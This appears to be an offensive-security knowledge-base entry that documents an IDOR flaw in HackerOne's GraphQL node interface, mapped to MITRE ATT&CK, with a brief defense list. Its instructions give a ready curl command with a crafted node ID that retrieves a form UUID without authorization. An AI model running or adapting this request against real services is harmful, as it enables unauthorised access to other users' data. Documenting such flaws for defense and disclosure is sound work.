---
id: proc-query-graphql-uuid
tags:
  - idor
  - graphql
  - uuid-enumeration
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/graphql-query-node-uuid]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:25:53.644Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Query-GraphQL-Node-to-Retrieve-UUID

## Summary

This procedure executes a GraphQL query against HackerOne's node interface using a modified node ID to retrieve the UUID of an EmbeddedSubmissionForm object, exploiting IDOR for unauthenticated access.

## Description

The GraphQL query targets the `node` field with the re-encoded ID, using an inline fragment to extract the `uuid` from EmbeddedSubmissionForm. Without proper authorization, this leaks UUIDs intended to be secure. The attack occurs over HTTPS to the public GraphQL endpoint, requiring only an HTTP client.

## Requirements

1. Re-encoded node ID (e.g., `Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==`).
2. HTTP client like curl.
3. Internet access to HackerOne API.

## Defense

Defensive measures and detection strategies:

- Implement authorization on node queries to restrict UUID access.
- Validate node IDs server-side against user permissions.
- Detect anomalous GraphQL query volumes or patterns.

## Objectives

1. Fetch the form's UUID via the vulnerable node interface.
2. Confirm successful IDOR exploitation.
3. Obtain UUID for further queries.

## Instructions

### Step 1: Execute GraphQL Query for UUID

**Context**: Send the query to the endpoint to extract the UUID using the node ID.

**Command** ([[commands/graphql-query-node-uuid]]):
```bash
curl -X POST https://api.hackerone.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query { node(id: \"Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==\") { ... on EmbeddedSubmissionForm { uuid } } }"}'
```

> The response includes the UUID in `data.node.uuid`, e.g., `{ "data": { "node": { "uuid": "████" } } }`. If null, the ID may not exist or post-fix applied.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques

- None

## Commands Used

- [[commands/graphql-query-node-uuid]]

## Tools Used

- None

## Tags

- [[idor]]
- [[graphql]]
- [[uuid-enumeration]]
